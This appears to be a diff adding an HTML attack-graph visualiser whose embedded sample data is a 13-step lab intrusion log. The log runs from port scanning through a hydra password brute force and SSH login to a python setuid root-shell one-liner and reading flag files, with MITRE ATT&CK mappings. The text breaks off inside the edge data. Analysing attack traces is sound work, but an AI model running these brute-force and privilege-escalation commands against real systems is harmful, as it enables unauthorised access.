@@ -1,0 +1,1759 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Attack Graph Visualizer</title>
+<script src="https://d3js.org/d3.v7.min.js"></script>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', system-ui, sans-serif; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+
+  #header { padding: 12px 20px; background: #161b22; border-bottom: 1px solid #30363d; display: flex; align-items: center; gap: 16px; flex-shrink: 0; }
+  #header h1 { font-size: 16px; font-weight: 600; color: #f0f6fc; }
+  #header .meta { font-size: 12px; color: #8b949e; }
+
+  #controls { display: flex; gap: 8px; margin-left: auto; }
+  .layer-btn { padding: 6px 14px; border: 1px solid #30363d; border-radius: 6px; background: #21262d; color: #8b949e; cursor: pointer; font-size: 13px; transition: all 0.15s; }
+  .layer-btn:hover { border-color: #58a6ff; color: #58a6ff; }
+  .layer-btn.active { background: #1f6feb; border-color: #1f6feb; color: #fff; }
+
+  #main { display: flex; flex: 1; overflow: hidden; }
+  #graph-container { flex: 1; position: relative; overflow: hidden; }
+  svg { width: 100%; height: 100%; }
+
+  #detail-panel { width: 320px; background: #161b22; border-left: 1px solid #30363d; overflow-y: auto; flex-shrink: 0; display: none; }
+  #detail-panel.visible { display: block; }
+  #detail-panel .panel-header { padding: 14px 16px; border-bottom: 1px solid #30363d; display: flex; justify-content: space-between; align-items: center; }
+  #detail-panel .panel-header h3 { font-size: 14px; font-weight: 600; color: #f0f6fc; }
+  #detail-panel .close-btn { cursor: pointer; color: #8b949e; font-size: 18px; line-height: 1; }
+  #detail-panel .close-btn:hover { color: #f0f6fc; }
+  .detail-body { padding: 16px; }
+  .detail-field { margin-bottom: 12px; }
+  .detail-field label { font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; color: #8b949e; display: block; margin-bottom: 4px; }
+  .detail-field .value { font-size: 13px; color: #c9d1d9; word-break: break-all; }
+  .detail-field .value.mono { font-family: 'Consolas', 'Courier New', monospace; background: #0d1117; padding: 6px 8px; border-radius: 4px; font-size: 12px; white-space: pre-wrap; }
+  .badge { display: inline-block; padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: 600; margin: 2px; }
+
+  #legend { position: absolute; bottom: 16px; left: 16px; background: rgba(22,27,34,0.92); border: 1px solid #30363d; border-radius: 8px; padding: 12px; min-width: 160px; max-height: 60vh; overflow-y: auto; }
+  #legend h4 { font-size: 11px; text-transform: uppercase; color: #8b949e; margin-bottom: 8px; letter-spacing: 0.5px; }
+  #legend .legend-section { margin-top: 10px; }
+  #legend .legend-section:first-child { margin-top: 0; }
+  .legend-item { display: flex; align-items: center; gap: 8px; margin-bottom: 5px; font-size: 12px; }
+  .legend-dot { width: 10px; height: 10px; border-radius: 50%; flex-shrink: 0; }
+  .legend-diamond { width: 10px; height: 10px; transform: rotate(45deg); flex-shrink: 0; }
+
+  .node .node-shape { stroke-width: 1.5; cursor: pointer; transition: stroke 0.15s; }
+  .node .node-shape:hover { stroke: #f0f6fc !important; stroke-width: 2.5; }
+  .node.selected .node-shape { stroke: #f0f6fc !important; stroke-width: 3; }
+  .node.noise .node-shape { opacity: 0.35; }
+  .node text { font-size: 10px; fill: #c9d1d9; pointer-events: none; }
+
+  .link { stroke-opacity: 0.6; fill: none; }
+  .link-sequence { stroke: #30363d; }
+  .link-produces { stroke: #3fb950; stroke-dasharray: 5,3; }
+  .link-enables  { stroke: #58a6ff; }
+
+  .tooltip { position: absolute; background: #21262d; border: 1px solid #30363d; border-radius: 6px; padding: 8px 10px; font-size: 12px; pointer-events: none; max-width: 260px; word-break: break-all; z-index: 10; }
+
+  #stats { position: absolute; top: 12px; left: 16px; font-size: 11px; color: #8b949e; }
+</style>
+</head>
+<body>
+
+<div id="header">
+  <h1>Attack Graph Visualizer</h1>
+  <span class="meta" id="meta-text"></span>
+  <div id="controls">
+    <button class="layer-btn active" data-layer="command">Commands</button>
+    <button class="layer-btn" data-layer="mitre">MITRE ATT&CK</button>
+    <button class="layer-btn" data-layer="actions">Actions &amp; Effects</button>
+  </div>
+</div>
+
+<div id="main">
+  <div id="graph-container">
+    <div id="stats"></div>
+    <svg id="svg"></svg>
+    <div id="legend">
+      <div id="legend-items"></div>
+    </div>
+    <div class="tooltip" id="tooltip" style="display:none"></div>
+  </div>
+  <div id="detail-panel">
+    <div class="panel-header">
+      <h3>Details</h3>
+      <span class="close-btn" id="close-panel">&times;</span>
+    </div>
+    <div class="detail-body" id="detail-body"></div>
+  </div>
+</div>
+
+<script>
+const GRAPH = {
+  "meta": {
+    "total_entries": 13,
+    "source_files": [
+      "example.txt"
+    ]
+  },
+  "nodes": [
+    {
+      "id": "cmd::0",
+      "layer": "command",
+      "label": "nmap -Pn -T4 -p- 10.10.10.5",
+      "entry_id": 0,
+      "source_file": "example.txt",
+      "command": "nmap -Pn -T4 -p- 10.10.10.5",
+      "reasoning": "Starting enumeration of the target machine.",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 0,
+        "tool": "nmap",
+        "action": "scanAllPorts",
+        "target": "",
+        "phase": "reconnaissance",
+        "is_noise": false,
+        "cleaned_command": "nmap -Pn -T4 -p- 10.10.10.5"
+      },
+      "mitre": {
+        "entry_id": 0,
+        "technique_id": "T1046",
+        "technique_name": "Network Service Discovery",
+        "tactic": "discovery",
+        "confidence": 0.7
+      },
+      "actions_effects": {
+        "entry_id": 0,
+        "action_name": "scanAllPorts",
+        "action_description": "Scan all TCP ports on target",
+        "phase": "reconnaissance",
+        "produces_effects": [
+          "openPortsKnown"
+        ],
+        "requires_effects": [],
+        "is_noise": false
+      },
+      "color_command": "#4e9af1",
+      "color_mitre": "#e8884a",
+      "color_action": "#4e9af1"
+    },
+    {
+      "id": "cmd::1",
+      "layer": "command",
+      "label": "nmap -sV -sC -p 22,80,3306 10.10.10.5",
+      "entry_id": 1,
+      "source_file": "example.txt",
+      "command": "nmap -sV -sC -p 22,80,3306 10.10.10.5",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 1,
+        "tool": "nmap",
+        "action": "scanAllPorts",
+        "target": "",
+        "phase": "reconnaissance",
+        "is_noise": false,
+        "cleaned_command": "nmap -sV -sC -p 22,80,3306 10.10.10.5"
+      },
+      "mitre": {
+        "entry_id": 1,
+        "technique_id": "T1046",
+        "technique_name": "Network Service Discovery",
+        "tactic": "discovery",
+        "confidence": 0.7
+      },
+      "actions_effects": {
+        "entry_id": 1,
+        "action_name": "scanAllPorts",
+        "action_description": "Scan all TCP ports on target",
+        "phase": "reconnaissance",
+        "produces_effects": [
+          "openPortsKnown"
+        ],
+        "requires_effects": [],
+        "is_noise": false
+      },
+      "color_command": "#4e9af1",
+      "color_mitre": "#e8884a",
+      "color_action": "#4e9af1"
+    },
+    {
+      "id": "cmd::2",
+      "layer": "command",
+      "label": "gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/di",
+      "entry_id": 2,
+      "source_file": "example.txt",
+      "command": "gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt",
+      "reasoning": "Found port 80 open with Apache. Let's check for web vulnerabilities.",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 2,
+        "tool": "gobuster",
+        "action": "enumerateWebDirs",
+        "target": "",
+        "phase": "reconnaissance",
+        "is_noise": false,
+        "cleaned_command": "gobuster dir -u http://10.10.10.5 -w /usr/share/wordlists/dirb/common.txt"
+      },
+      "mitre": {
+        "entry_id": 2,
+        "technique_id": "T1083",
+        "technique_name": "File and Directory Discovery",
+        "tactic": "discovery",
+        "confidence": 0.7
+      },
+      "actions_effects": {
+        "entry_id": 2,
+        "action_name": "enumerateWebDirs",
+        "action_description": "Enumerate web directories",
+        "phase": "reconnaissance",
+        "produces_effects": [
+          "webDirsKnown"
+        ],
+        "requires_effects": [
+          "openPortsKnown"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#4e9af1",
+      "color_mitre": "#e8884a",
+      "color_action": "#4e9af1"
+    },
+    {
+      "id": "cmd::3",
+      "layer": "command",
+      "label": "nikto -h http://10.10.10.5",
+      "entry_id": 3,
+      "source_file": "example.txt",
+      "command": "nikto -h http://10.10.10.5",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 3,
+        "tool": "nikto",
+        "action": "scanWebApp",
+        "target": "",
+        "phase": "reconnaissance",
+        "is_noise": false,
+        "cleaned_command": "nikto -h http://10.10.10.5"
+      },
+      "mitre": {
+        "entry_id": 3,
+        "technique_id": "T1059",
+        "technique_name": "Command and Scripting",
+        "tactic": "execution",
+        "confidence": 0.7
+      },
+      "actions_effects": {
+        "entry_id": 3,
+        "action_name": "scanWebApp",
+        "action_description": "Scan web app for vulns",
+        "phase": "reconnaissance",
+        "produces_effects": [
+          "webVulnsKnown"
+        ],
+        "requires_effects": [
+          "openPortsKnown"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#4e9af1",
+      "color_mitre": "#f1c94e",
+      "color_action": "#4e9af1"
+    },
+    {
+      "id": "cmd::4",
+      "layer": "command",
+      "label": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.",
+      "entry_id": 4,
+      "source_file": "example.txt",
+      "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.5 http-post-form \"/admin/login:username=^USER^&password=^PASS^:Invalid\"",
+      "reasoning": "Discovered /admin login page. Trying default credentials first, then brute force.",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 4,
+        "tool": "hydra",
+        "action": "bruteForceCredentials",
+        "target": "",
+        "phase": "exploitation",
+        "is_noise": false,
+        "cleaned_command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.5 http-post-form \"/admin/login:username=^USER^&password=^PASS^:Invalid\""
+      },
+      "mitre": {
+        "entry_id": 4,
+        "technique_id": "T1110",
+        "technique_name": "Brute Force",
+        "tactic": "credential-access",
+        "confidence": 0.7
+      },
+      "actions_effects": {
+        "entry_id": 4,
+        "action_name": "bruteForceCredentials",
+        "action_description": "Brute-force login service",
+        "phase": "exploitation",
+        "produces_effects": [
+          "credentialsObtained"
+        ],
+        "requires_effects": [
+          "openPortsKnown"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#e84a4a",
+      "color_mitre": "#da77f2",
+      "color_action": "#e84a4a"
+    },
+    {
+      "id": "cmd::5",
+      "layer": "command",
+      "label": "ssh admin@10.10.10.5",
+      "entry_id": 5,
+      "source_file": "example.txt",
+      "command": "ssh admin@10.10.10.5",
+      "reasoning": "Got credentials admin:password123. Logging in via SSH.",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 5,
+        "tool": "ssh",
+        "action": "loginSSH",
+        "target": "",
+        "phase": "exploitation",
+        "is_noise": false,
+        "cleaned_command": "ssh admin@10.10.10.5"
+      },
+      "mitre": {
+        "entry_id": 5,
+        "technique_id": "T1078",
+        "technique_name": "Valid Accounts",
+        "tactic": "initial-access",
+        "confidence": 0.7
+      },
+      "actions_effects": {
+        "entry_id": 5,
+        "action_name": "loginSSH",
+        "action_description": "Log in via SSH",
+        "phase": "exploitation",
+        "produces_effects": [
+          "shellAccessGained"
+        ],
+        "requires_effects": [
+          "credentialsObtained"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#e84a4a",
+      "color_mitre": "#c97fc9",
+      "color_action": "#e84a4a"
+    },
+    {
+      "id": "cmd::6",
+      "layer": "command",
+      "label": "whoami",
+      "entry_id": 6,
+      "source_file": "example.txt",
+      "command": "whoami",
+      "reasoning": "Checking what we have access to.",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 6,
+        "tool": "whoami",
+        "action": "gatherSystemInfo",
+        "target": "",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "whoami"
+      },
+      "mitre": {
+        "entry_id": 6,
+        "technique_id": "T1033",
+        "technique_name": "System Owner/User Discovery",
+        "tactic": "discovery",
+        "confidence": 0.7
+      },
+      "actions_effects": {
+        "entry_id": 6,
+        "action_name": "gatherSystemInfo",
+        "action_description": "Gather system user info",
+        "phase": "post-exploitation",
+        "produces_effects": [
+          "systemInfoKnown"
+        ],
+        "requires_effects": [
+          "shellAccessGained"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#e8884a",
+      "color_action": "#f1c94e"
+    },
+    {
+      "id": "cmd::7",
+      "layer": "command",
+      "label": "id",
+      "entry_id": 7,
+      "source_file": "example.txt",
+      "command": "id",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 7,
+        "tool": "id",
+        "action": "gatherSystemInfo",
+        "target": "",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "id"
+      },
+      "mitre": {
+        "entry_id": 7,
+        "technique_id": "T1033",
+        "technique_name": "System Owner/User Discovery",
+        "tactic": "discovery",
+        "confidence": 0.7
+      },
+      "actions_effects": {
+        "entry_id": 7,
+        "action_name": "gatherSystemInfo",
+        "action_description": "Gather system user info",
+        "phase": "post-exploitation",
+        "produces_effects": [
+          "systemInfoKnown"
+        ],
+        "requires_effects": [
+          "shellAccessGained"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#e8884a",
+      "color_action": "#f1c94e"
+    },
+    {
+      "id": "cmd::8",
+      "layer": "command",
+      "label": "sudo -l",
+      "entry_id": 8,
+      "source_file": "example.txt",
+      "command": "sudo -l",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 8,
+        "tool": "sudo",
+        "action": "executeCommand",
+        "target": "",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "sudo -l"
+      },
+      "mitre": {
+        "entry_id": 8,
+        "technique_id": "T1059",
+        "technique_name": "Command and Scripting",
+        "tactic": "execution",
+        "confidence": 0.7
+      },
+      "actions_effects": {
+        "entry_id": 8,
+        "action_name": "executeCommand",
+        "action_description": "Execute sudo",
+        "phase": "post-exploitation",
+        "produces_effects": [
+          "commandExecuted"
+        ],
+        "requires_effects": [
+          "shellAccessGained"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#f1c94e",
+      "color_action": "#f1c94e"
+    },
+    {
+      "id": "cmd::9",
+      "layer": "command",
+      "label": "find / -perm -4000 -type f 2>/dev/null",
+      "entry_id": 9,
+      "source_file": "example.txt",
+      "command": "find / -perm -4000 -type f 2>/dev/null",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 9,
+        "tool": "find",
+        "action": "findSUIDBinaries",
+        "target": "",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "find / -perm -4000 -type f 2>/dev/null"
+      },
+      "mitre": {
+        "entry_id": 9,
+        "technique_id": "T1083",
+        "technique_name": "File and Directory Discovery",
+        "tactic": "discovery",
+        "confidence": 0.7
+      },
+      "actions_effects": {
+        "entry_id": 9,
+        "action_name": "findSUIDBinaries",
+        "action_description": "Find SUID binaries",
+        "phase": "post-exploitation",
+        "produces_effects": [
+          "suidBinariesKnown"
+        ],
+        "requires_effects": [
+          "shellAccessGained"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#e8884a",
+      "color_action": "#f1c94e"
+    },
+    {
+      "id": "cmd::10",
+      "layer": "command",
+      "label": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+      "entry_id": 10,
+      "source_file": "example.txt",
+      "command": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
+      "reasoning": "Found SUID binary. Exploiting for root.",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 10,
+        "tool": "python3",
+        "action": "executeCommand",
+        "target": "",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
+      },
+      "mitre": {
+        "entry_id": 10,
+        "technique_id": "T1059",
+        "technique_name": "Command and Scripting",
+        "tactic": "execution",
+        "confidence": 0.7
+      },
+      "actions_effects": {
+        "entry_id": 10,
+        "action_name": "executeCommand",
+        "action_description": "Execute python3",
+        "phase": "post-exploitation",
+        "produces_effects": [
+          "commandExecuted"
+        ],
+        "requires_effects": [
+          "shellAccessGained"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#f1c94e",
+      "color_action": "#f1c94e"
+    },
+    {
+      "id": "cmd::11",
+      "layer": "command",
+      "label": "cat /root/flag.txt",
+      "entry_id": 11,
+      "source_file": "example.txt",
+      "command": "cat /root/flag.txt",
+      "reasoning": "Got root! Reading the flag.",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 11,
+        "tool": "cat",
+        "action": "readSensitiveFile",
+        "target": "",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "cat /root/flag.txt"
+      },
+      "mitre": {
+        "entry_id": 11,
+        "technique_id": "T1083",
+        "technique_name": "File and Directory Discovery",
+        "tactic": "discovery",
+        "confidence": 0.7
+      },
+      "actions_effects": {
+        "entry_id": 11,
+        "action_name": "readSensitiveFile",
+        "action_description": "Read a file",
+        "phase": "post-exploitation",
+        "produces_effects": [
+          "fileContentsRead"
+        ],
+        "requires_effects": [
+          "shellAccessGained"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#e8884a",
+      "color_action": "#f1c94e"
+    },
+    {
+      "id": "cmd::12",
+      "layer": "command",
+      "label": "cat /home/user/user.txt",
+      "entry_id": 12,
+      "source_file": "example.txt",
+      "command": "cat /home/user/user.txt",
+      "reasoning": "",
+      "output": "",
+      "exit_code": null,
+      "agent_name": "example",
+      "raw": {
+        "entry_id": 12,
+        "tool": "cat",
+        "action": "readSensitiveFile",
+        "target": "",
+        "phase": "post-exploitation",
+        "is_noise": false,
+        "cleaned_command": "cat /home/user/user.txt"
+      },
+      "mitre": {
+        "entry_id": 12,
+        "technique_id": "T1083",
+        "technique_name": "File and Directory Discovery",
+        "tactic": "discovery",
+        "confidence": 0.7
+      },
+      "actions_effects": {
+        "entry_id": 12,
+        "action_name": "readSensitiveFile",
+        "action_description": "Read a file",
+        "phase": "post-exploitation",
+        "produces_effects": [
+          "fileContentsRead"
+        ],
+        "requires_effects": [
+          "shellAccessGained"
+        ],
+        "is_noise": false
+      },
+      "color_command": "#f1c94e",
+      "color_mitre": "#e8884a",
+      "color_action": "#f1c94e"
+    }
+  ],
+  "actions_effects_nodes": [
+    {
+      "id": "action::scanAllPorts",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "scanAllPorts",
+      "name": "scanAllPorts",
+      "description": "Scan all TCP ports on target",
+      "phase": "reconnaissance",
+      "color": "#4e9af1",
+      "entry_ids": [
+        0,
+        1
+      ],
+      "produces_effects": [
+        "openPortsKnown"
+      ],
+      "requires_effects": []
+    },
+    {
+      "id": "action::enumerateWebDirs",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "enumerateWebDirs",
+      "name": "enumerateWebDirs",
+      "description": "Enumerate web directories",
+      "phase": "reconnaissance",
+      "color": "#4e9af1",
+      "entry_ids": [
+        2
+      ],
+      "produces_effects": [
+        "webDirsKnown"
+      ],
+      "requires_effects": [
+        "openPortsKnown"
+      ]
+    },
+    {
+      "id": "action::scanWebApp",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "scanWebApp",
+      "name": "scanWebApp",
+      "description": "Scan web app for vulns",
+      "phase": "reconnaissance",
+      "color": "#4e9af1",
+      "entry_ids": [
+        3
+      ],
+      "produces_effects": [
+        "webVulnsKnown"
+      ],
+      "requires_effects": [
+        "openPortsKnown"
+      ]
+    },
+    {
+      "id": "action::bruteForceCredentials",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "bruteForceCredentials",
+      "name": "bruteForceCredentials",
+      "description": "Brute-force login service",
+      "phase": "exploitation",
+      "color": "#e84a4a",
+      "entry_ids": [
+        4
+      ],
+      "produces_effects": [
+        "credentialsObtained"
+      ],
+      "requires_effects": [
+        "openPortsKnown"
+      ]
+    },
+    {
+      "id": "action::loginSSH",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "loginSSH",
+      "name": "loginSSH",
+      "description": "Log in via SSH",
+      "phase": "exploitation",
+      "color": "#e84a4a",
+      "entry_ids": [
+        5
+      ],
+      "produces_effects": [
+        "shellAccessGained"
+      ],
+      "requires_effects": [
+        "credentialsObtained"
+      ]
+    },
+    {
+      "id": "action::gatherSystemInfo",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "gatherSystemInfo",
+      "name": "gatherSystemInfo",
+      "description": "Gather system user info",
+      "phase": "post-exploitation",
+      "color": "#f1c94e",
+      "entry_ids": [
+        6,
+        7
+      ],
+      "produces_effects": [
+        "systemInfoKnown"
+      ],
+      "requires_effects": [
+        "shellAccessGained"
+      ]
+    },
+    {
+      "id": "action::executeCommand",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "executeCommand",
+      "name": "executeCommand",
+      "description": "Execute sudo",
+      "phase": "post-exploitation",
+      "color": "#f1c94e",
+      "entry_ids": [
+        8,
+        10
+      ],
+      "produces_effects": [
+        "commandExecuted"
+      ],
+      "requires_effects": [
+        "shellAccessGained"
+      ]
+    },
+    {
+      "id": "action::findSUIDBinaries",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "findSUIDBinaries",
+      "name": "findSUIDBinaries",
+      "description": "Find SUID binaries",
+      "phase": "post-exploitation",
+      "color": "#f1c94e",
+      "entry_ids": [
+        9
+      ],
+      "produces_effects": [
+        "suidBinariesKnown"
+      ],
+      "requires_effects": [
+        "shellAccessGained"
+      ]
+    },
+    {
+      "id": "action::readSensitiveFile",
+      "node_type": "action",
+      "layer": "actions",
+      "label": "readSensitiveFile",
+      "name": "readSensitiveFile",
+      "description": "Read a file",
+      "phase": "post-exploitation",
+      "color": "#f1c94e",
+      "entry_ids": [
+        11,
+        12
+      ],
+      "produces_effects": [
+        "fileContentsRead"
+      ],
+      "requires_effects": [
+        "shellAccessGained"
+      ]
+    },
+    {
+      "id": "effect::openPortsKnown",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "openPortsKnown",
+      "name": "openPortsKnown",
+      "color": "#6e48aa",
+      "produced_by": [
+        "scanAllPorts"
+      ],
+      "enables_actions": [
+        "enumerateWebDirs",
+        "scanWebApp",
+        "bruteForceCredentials"
+      ]
+    },
+    {
+      "id": "effect::webDirsKnown",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "webDirsKnown",
+      "name": "webDirsKnown",
+      "color": "#6e48aa",
+      "produced_by": [
+        "enumerateWebDirs"
+      ],
+      "enables_actions": []
+    },
+    {
+      "id": "effect::webVulnsKnown",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "webVulnsKnown",
+      "name": "webVulnsKnown",
+      "color": "#6e48aa",
+      "produced_by": [
+        "scanWebApp"
+      ],
+      "enables_actions": []
+    },
+    {
+      "id": "effect::credentialsObtained",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "credentialsObtained",
+      "name": "credentialsObtained",
+      "color": "#6e48aa",
+      "produced_by": [
+        "bruteForceCredentials"
+      ],
+      "enables_actions": [
+        "loginSSH"
+      ]
+    },
+    {
+      "id": "effect::shellAccessGained",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "shellAccessGained",
+      "name": "shellAccessGained",
+      "color": "#6e48aa",
+      "produced_by": [
+        "loginSSH"
+      ],
+      "enables_actions": [
+        "gatherSystemInfo",
+        "executeCommand",
+        "findSUIDBinaries",
+        "readSensitiveFile"
+      ]
+    },
+    {
+      "id": "effect::systemInfoKnown",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "systemInfoKnown",
+      "name": "systemInfoKnown",
+      "color": "#6e48aa",
+      "produced_by": [
+        "gatherSystemInfo"
+      ],
+      "enables_actions": []
+    },
+    {
+      "id": "effect::commandExecuted",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "commandExecuted",
+      "name": "commandExecuted",
+      "color": "#6e48aa",
+      "produced_by": [
+        "executeCommand"
+      ],
+      "enables_actions": []
+    },
+    {
+      "id": "effect::suidBinariesKnown",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "suidBinariesKnown",
+      "name": "suidBinariesKnown",
+      "color": "#6e48aa",
+      "produced_by": [
+        "findSUIDBinaries"
+      ],
+      "enables_actions": []
+    },
+    {
+      "id": "effect::fileContentsRead",
+      "node_type": "effect",
+      "layer": "actions",
+      "label": "fileContentsRead",
+      "name": "fileContentsRead",
+      "color": "#6e48aa",
+      "produced_by": [
+        "readSensitiveFile"
+      ],
+      "enables_actions": []
+    }
+  ],
+  "mitre_nodes": [
+    {
+      "id": "mitre::T1046",
+      "layer": "mitre",
+      "label": "T1046",
+      "technique_name": "Network Service Discovery",
+      "tactic": "discovery",
+      "color": "#e8884a",
+      "entry_ids": [
+        0,
+        1
+      ]
+    },
+    {
+      "id": "mitre::T1083",
+      "layer": "mitre",
+      "label": "T1083",
+      "technique_name": "File and Directory Discovery",
+      "tactic": "discovery",
+      "color": "#e8884a",
+      "entry_ids": [
+        2,
+        9,
+        11,
+        12
+      ]
+    },
+    {
+      "id": "mitre::T1059",
+      "layer": "mitre",
+      "label": "T1059",
+      "technique_name": "Command and Scripting",
+      "tactic": "execution",
+      "color": "#f1c94e",
+      "entry_ids": [
+        3,
+        8,
+        10
+      ]
+    },
+    {
+      "id": "mitre::T1110",
+      "layer": "mitre",
+      "label": "T1110",
+      "technique_name": "Brute Force",
+      "tactic": "credential-access",
+      "color": "#da77f2",
+      "entry_ids": [
+        4
+      ]
+    },
+    {
+      "id": "mitre::T1078",
+      "layer": "mitre",
+      "label": "T1078",
+      "technique_name": "Valid Accounts",
+      "tactic": "initial-access",
+      "color": "#c97fc9",
+      "entry_ids": [
+        5
+      ]
+    },
+    {
+      "id": "mitre::T1033",
+      "layer": "mitre",
+      "label": "T1033",
+      "technique_name": "System Owner/User Discovery",
+      "tactic": "discovery",
+      "color": "#e8884a",
+      "entry_ids": [
+        6,
+        7
+      ]
+    }
+  ],
+  "edges": [
+    {
+      "source": "cmd::0",
+      "target": "cmd::1",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::1",
+      "target": "cmd::2",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::2",
+      "target": "cmd::3",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::3",
+      "target": "cmd::4",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::4",
+      "target": "cmd::5",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::5",
+      "target": "cmd::6",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::6",
+      "target": "cmd::7",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::7",
+      "target": "cmd::8",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::8",
+      "target": "cmd::9",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::9",
+      "target": "cmd::10",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::10",
+      "target": "cmd::11",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "cmd::11",
+      "target": "cmd::12",
+      "type": "sequence",
+      "layer": "command"
+    },
+    {
+      "source": "action::scanAllPorts",
+      "target": "effect::openPortsKnown",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "action::enumerateWebDirs",
+      "target": "effect::webDirsKnown",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "effect::openPortsKnown",
+      "target": "action::enumerateWebDirs",
+      "type": "enables",
+      "layer": "actions"
+    },
+    {
+      "source": "action::scanWebApp",
+      "target": "effect::webVulnsKnown",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "effect::openPortsKnown",
+      "target": "action::scanWebApp",
+      "type": "enables",
+      "layer": "actions"
+    },
+    {
+      "source": "action::bruteForceCredentials",
+      "target": "effect::credentialsObtained",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "effect::openPortsKnown",
+      "target": "action::bruteForceCredentials",
+      "type": "enables",
+      "layer": "actions"
+    },
+    {
+      "source": "action::loginSSH",
+      "target": "effect::shellAccessGained",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "effect::credentialsObtained",
+      "target": "action::loginSSH",
+      "type": "enables",
+      "layer": "actions"
+    },
+    {
+      "source": "action::gatherSystemInfo",
+      "target": "effect::systemInfoKnown",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "effect::shellAccessGained",
+      "target": "action::gatherSystemInfo",
+      "type": "enables",
+      "layer": "actions"
+    },
+    {
+      "source": "action::executeCommand",
+      "target": "effect::commandExecuted",
+      "type": "produces",
+      "layer": "actions"
+    },
+    {
+      "source": "effect::shellAccessGained",
+      "target": "action::executeCommand",
+      "type": "enables",
+      "layer": "actions"
+    },
+    {
+      "source": "action::findSUIDBinaries",
+      "target": "effect::suidBinariesKnown",
+      "type": "produces",
